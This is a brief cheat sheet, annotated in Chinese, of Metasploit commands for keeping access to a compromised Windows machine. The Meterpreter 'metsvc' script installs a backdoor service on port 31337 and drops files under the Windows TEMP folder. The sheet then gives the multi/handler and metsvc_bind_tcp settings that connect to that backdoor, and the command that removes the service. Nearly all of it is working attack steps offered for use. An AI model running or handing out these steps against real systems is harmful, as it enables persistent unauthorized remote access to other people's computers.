	Meterpreter> run metsvc -A
	在C:Windows\TEMP下随机生成目录三个文件，创建服务metsvc 31337端口
	连接后门
	Msf>use exploit/multi/handler
	Msf>set payload windows/metsvc_bind_tcp
	Msf>set rhost 192.168.1.2
	Msf>set rport 31337
	Msf>run
	删除服务
	Meterpreter > run metsvc –r